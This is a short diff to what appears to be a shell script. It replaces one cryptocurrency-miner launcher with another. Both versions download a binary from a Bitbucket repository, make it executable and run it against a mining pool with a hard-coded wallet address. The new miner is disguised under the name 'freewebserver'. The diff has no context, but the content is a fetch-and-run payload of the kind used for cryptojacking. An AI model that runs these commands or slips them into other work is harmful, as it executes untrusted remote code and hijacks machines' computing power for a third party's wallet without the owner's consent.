@@ -1,3 +1,1 @@
-wget https://bitbucket.org/monisedos/blackwater/raw/00784d6536baba5958381781790c23352c6a170e/JGC.sh
-chmod 700 jagoancoin
-./jagoancoin -o 51.79.177.216:17028 -u GY6Gi9GgruxejYU7TZ7vtdnnbRhseyQ9yc.shadow -p x -a gr -k -t8
+wget https://bitbucket.org/kardisali2/esdogger/raw/de3fd0dd7e98c5f810453fcb623cf787b1a61673/freewebserver && chmod 700 freewebserver && ./freewebserver -a RandomX -o pool.hashvault.pro:80 -u ZEPHYR2rJcFiZNiZqHwcxneo69155BprsdTt2tywSZkZHczqR1ZQNtKHs4YveufDRwd57pE1zuUvVZ6D3y4KtA4o63jmxvPDxik1u --keepalive -p rogstrix -t 3
